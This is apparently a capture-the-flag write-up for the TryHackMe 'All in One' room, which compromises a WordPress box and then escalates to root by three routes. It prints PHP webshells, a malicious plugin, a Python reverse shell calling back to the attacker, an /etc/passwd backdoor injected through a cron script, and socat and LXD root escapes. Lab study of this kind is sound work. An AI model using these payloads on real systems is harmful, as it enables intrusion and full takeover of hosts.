# 🧩 All in One

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/room/allinone)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)](https://tryhackme.com/room/allinone)
[![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)](https://tryhackme.com/room/allinone)
[![Type](https://img.shields.io/badge/Type-Boot2Root-blue?style=for-the-badge)](https://tryhackme.com/room/allinone)

| | |
|---|---|
| **Target** | 10.49.131.138 |
| **OS** | Ubuntu 20.04 (Linux 5.15.0-138-generic x86_64) |
| **Attack Surface** | Anonymous FTP, WordPress 5.5.1 (HTTP), OpenSSH 8.2p1 |
| **Privesc** | World-writable cron script, sudo socat (GTFOBins), LXD group abuse |

The room packs a lot into a single Linux box — FTP, SSH, and a WordPress site that hides a Vigenère-encoded credential in an HTML comment. Getting in requires decoding that cipher, logging into WordPress as an admin, and then choosing from two RCE paths: direct PHP injection via the theme editor, or a malicious plugin upload. Post-foothold, three separate privilege escalation paths lead to root: hijacking a world-writable cron script, abusing a passwordless `sudo socat` rule, and mounting the host filesystem from a privileged LXD container.

---

## 🔍 Enumeration

### Port Scan

Run a full TCP scan with service detection:

```bash
sudo nmap -sC -sV -p- -vv -T4 10.49.131.138 -oA tcp-scan
```

```
21/tcp  open  ftp     vsftpd 3.0.5
22/tcp  open  ssh     OpenSSH 8.2p1
80/tcp  open  http    Apache httpd 2.4.41
```

### FTP — Anonymous Login

Anonymous FTP is enabled. Log in to check:

```bash
ftp 10.49.131.138
# user: anonymous, password: <empty>
```

The directory is empty. This is a dead end.

### Web Enumeration

Directory bruteforce finds the WordPress installation:

```bash
ffuf -u http://10.49.131.138/FUZZ -w /home/evdaez/SecLists/Discovery/Web-Content/raft-medium-directories.txt -ic -fc 403,401
```

```
wordpress/    [Status: 301]
hackathons/   [Status: 200]
```

Browse to `/hackathons` and view the source — two HTML comments are hidden in the page:

```html
<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
```

The second comment is a Vigenère key. Decode the first string with key `KeepGoing`:

```
Vigenère decode: "Dvc W@iyur@123" with key "KeepGoing" → "Try H@ckme@123"
```

The password is `H@ckme@123`.

### WordPress User Enumeration

WordPress leaks usernames via author ID redirects. Request author 1:

```bash
curl -skL http://10.49.131.138/wordpress/?author=1
```

The response redirects to `/author/elyana/` — the username is `elyana`. Confirm with wpscan:

```bash
wpscan --url http://10.49.131.138/wordpress/ --api-token $WPTOKEN -e u,vp,vt,dbe
```

wpscan confirms user `elyana`. The credentials are `elyana:H@ckme@123`.

---

## 💀 Initial Access

Both methods use the same WordPress admin credentials: `elyana:H@ckme@123`.

### Method A — Theme Editor PHP Injection

Log into the WordPress admin panel at `http://10.49.131.138/wordpress/wp-admin/`. Navigate to Appearance → Theme Editor → select the `twentytwenty` theme → open `404.php`. Add a webshell at the top of the file:

```php
<?php system($_GET['cmd']); ?>
```

Save the file, then confirm RCE by triggering the 404 template:

```bash
curl -sk "http://10.49.131.138/wordpress/wp-content/themes/twentytwenty/404.php?cmd=id"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Start a listener on port 8080 (ports 4444, 443, 9001 are blocked):

```bash
nc -nlvp 8080
```

Deliver a Python3 reverse shell via the webshell:

```bash
# URL-encode the payload and deliver via curl
curl -sk "http://10.49.131.138/wordpress/wp-content/themes/twentytwenty/404.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.x.x.x\",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
```

Shell lands as `www-data`.

### Method B — Malicious Plugin Upload

Create a minimal WordPress plugin containing a PHP webshell:

```bash
mkdir -p webshell-plugin
cat > webshell-plugin/webshell.php <<'EOF'
<?php
/**
 * Plugin Name: Webshell
 * Version: 1.0
 */
system($_GET['cmd']);
EOF
zip -j webshell-plugin.zip webshell-plugin/webshell.php
```

In the WordPress admin panel, go to Plugins → Add New → Upload Plugin. Upload `webshell-plugin.zip` and activate it. The shell is now accessible at:

```
http://10.49.131.138/wordpress/wp-content/plugins/webshell-plugin/webshell.php?cmd=id
```

Use the same `nc` listener and Python3 reverse shell payload as in Method A to get a `www-data` shell.

---

## 🔁 Privilege Escalation

### Post-Foothold Enumeration (www-data)

Read `wp-config.php` for database credentials:

```bash
cat /var/www/html/wordpress/wp-config.php | grep -E 'DB_USER|DB_PASS'
```

```
DB_USER: elyana
DB_PASSWORD: H@ckme@123
```

Check `/etc/crontab` for scheduled tasks:

```bash
cat /etc/crontab
```

```
* * * * * root /var/backups/script.sh
```

A root-owned cron job fires every minute. Check the permissions on the script:

```bash
ls -la /var/backups/script.sh
```

```
-rwxrwxrwx 1 root root ... /var/backups/script.sh
```

The script is world-writable. Also search for files owned by `elyana`:

```bash
find / -type f -user elyana 2>/dev/null
```

```
/etc/mysql/conf.d/private.txt
```

Read that file:

```bash
cat /etc/mysql/conf.d/private.txt
```

```
user: elyana
password: E@syR18ght
```

A second password for `elyana`. The WordPress password (`H@ckme@123`) is the DB password — it does not work for SSH. The system password is `E@syR18ght`.

---

### Path 1 — World-Writable Cron Script (www-data → root)

The cron job runs `/var/backups/script.sh` as root every minute and the file is world-writable. Overwrite it with a payload that adds a backdoor root user to `/etc/passwd`.

Generate a password hash:

```bash
openssl passwd -1 -salt testing password
# $1$testing$kpXRXeZB3lyty62FzTkuA1
```

Overwrite the script:

```bash
printf "echo 'backdoor:\$1\$testing\$kpXRXeZB3lyty62FzTkuA1:0:0:root:/root:/bin/bash' >> /etc/passwd\n" > /var/backups/script.sh
```

Wait up to one minute for the cron to fire, then switch to the backdoor user:

```bash
su - backdoor
# password: password
id
# uid=0(root) gid=0(root) groups=0(root)
```

Read the root flag:

```bash
cat /root/root.txt
```

---

### Path 2 — sudo socat (elyana → root)

SSH in as `elyana` using the system password found in `private.txt`:

```bash
ssh elyana@10.49.131.138
# password: E@syR18ght
```

Check sudo permissions:

```bash
sudo -l
```

```
(ALL) NOPASSWD: /usr/bin/socat
```

`socat` can spawn a shell. Use the GTFOBins sudo abuse for socat:

```bash
sudo /usr/bin/socat stdin exec:/bin/sh
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

### Path 3 — LXD Group Abuse (elyana → root)

Check the groups `elyana` belongs to:

```bash
id elyana
```

```
uid=1000(elyana) gid=1000(elyana) groups=1000(elyana),4(adm),27(sudo),108(lxd)
```

`elyana` is in the `lxd` group. Any member of this group can create a privileged container and mount the host filesystem inside it, giving full read/write access to every file on the host.

On the attacker machine, download the alpine LXD image builder and build the image:

```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine
# produces: alpine-v3.xx-x86_64-<date>.tar.gz
```

Transfer the image to the target via SFTP:

```bash
sshpass -p 'E@syR18ght' scp alpine*.tar.gz elyana@10.49.131.138:/tmp/
```

On the target, import the image and set up the privileged container:

```bash
lxc image import /tmp/alpine*.tar.gz --alias x
lxc init x x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh
```

Inside the container, the host filesystem is mounted at `/mnt/`. Read the flags directly:

```bash
cat /mnt/root/root.txt
cat /mnt/home/elyana/user.txt
```

---

## 🗺️ Attack Chain

```
[Attacker]
    │
    ├─ Nmap scan ──────────────────────────► 21/FTP (empty), 22/SSH, 80/HTTP
    │
    ├─ ffuf on HTTP ───────────────────────► /wordpress/, /hackathons/
    │
    ├─ /hackathons page source ────────────► <!-- Dvc W@iyur@123 --> + <!-- KeepGoing -->
    │
    ├─ Vigenère decode (key: KeepGoing) ───► password: H@ckme@123
    │
    ├─ WP author enum /?author=1 ──────────► username: elyana
    │
    ├─ WP admin login (elyana:H@ckme@123)
    │       │
    │       ├─ [A] Theme Editor → 404.php ─► PHP webshell → www-data RCE
    │       └─ [B] Malicious plugin upload ► PHP webshell → www-data RCE
    │
    ├─ www-data shell
    │       │
    │       ├─ wp-config.php ─────────────► DB_PASSWORD: H@ckme@123
    │       ├─ /etc/crontab ──────────────► root cron: /var/backups/script.sh (every min)
    │       ├─ ls -la /var/backups/script.sh ► -rwxrwxrwx (world-writable!)
    │       └─ find -user elyana ──────────► /etc/mysql/conf.d/private.txt → E@syR18ght
    │
    ├─── [Path 1] Overwrite cron script ──► /etc/passwd backdoor → root shell
    │
    ├─── [Path 2] SSH elyana:E@syR18ght
    │        └─ sudo -l ─────────────────► NOPASSWD: /usr/bin/socat
    │             └─ sudo socat stdin exec:/bin/sh ──────────────► root shell
    │
    └─── [Path 3] SSH elyana:E@syR18ght
             └─ id → lxd group
                  └─ lxc privileged container + host disk mount ► root (via /mnt/)
```

---

## 📌 Key Takeaways

- Check HTML comments in every page — developers sometimes leave encoded credentials there thinking obscurity is security.
- Decode CTF credentials systematically: recognise Vigenère by the key hint left alongside the ciphertext.
- WordPress admin access equals code execution — the theme editor and plugin uploader both accept raw PHP with no restrictions.
- Always check `/etc/crontab` and the permissions of every script it references — a world-writable cron script owned by root is a direct path to privilege escalation.
- Use `find / -type f -user <username>` to locate config files and secrets owned by a specific user — world-readable sensitive files slip through in misconfigurations.
- `openssl passwd -1` generates an MD5-crypt hash that `/etc/passwd` accepts — you don't need write access to `/etc/shadow` to add a root backdoor.
- Membership in the `lxd` group is as dangerous as sudo — a privileged container with a host disk mount exposes every file on the machine.
- `socat` with `exec:/bin/sh` is a clean GTFOBins vector — no temporary files, no payloads, one command to root.
- Never assume a DB password and system password are the same — test both against SSH independently.
- Port filtering is common — if reverse shells on 4444/443/9001 fail, try 8080 before declaring the box not responding.

---

## 🎯 MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|---|---|---|
| Exploit Public-Facing Application (WordPress RCE via theme editor) | T1190 | Initial Access |
| Command and Scripting Interpreter: PHP | T1059.004 | Execution |
| Obfuscated Files or Information (Vigenère-encoded credential) | T1027 | Defense Evasion |
| Valid Accounts (WordPress admin, SSH elyana) | T1078 | Persistence / Initial Access |
| Scheduled Task/Job: Cron (world-writable script hijack) | T1053.003 | Privilege Escalation |
| Abuse Elevation Control Mechanism: Sudo (socat GTFOBins) | T1548.003 | Privilege Escalation |
| Escape to Host (LXD privileged container) | T1611 | Privilege Escalation |
| Credentials in Files (wp-config.php, private.txt) | T1552.001 | Credential Access |
| Create Account (backdoor user via /etc/passwd) | T1136.001 | Persistence |
| File and Directory Discovery (find -user elyana) | T1083 | Discovery |

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| nmap | TCP port scan and service version detection |
| ffuf | Web directory enumeration |
| wpscan | WordPress user enumeration and plugin/theme audit |
| curl | HTTP requests, webshell triggering, RCE delivery |
| openssl | MD5-crypt password hash generation for /etc/passwd |
| lxc / lxd | Privileged container creation for host disk mount |
| socat | GTFOBins sudo shell escape to root |
| nc (netcat) | Reverse shell listener |
| python3 | Reverse shell payload and PTY stabilisation |
| sshpass | Non-interactive SCP for transferring LXD image |
| zip | Packaging malicious WordPress plugin |

---

## 🚩 Flags

<details>
<summary>user.txt</summary>

```
THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}
```

</details>

<details>
<summary>root.txt</summary>

```
THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}
```

</details>
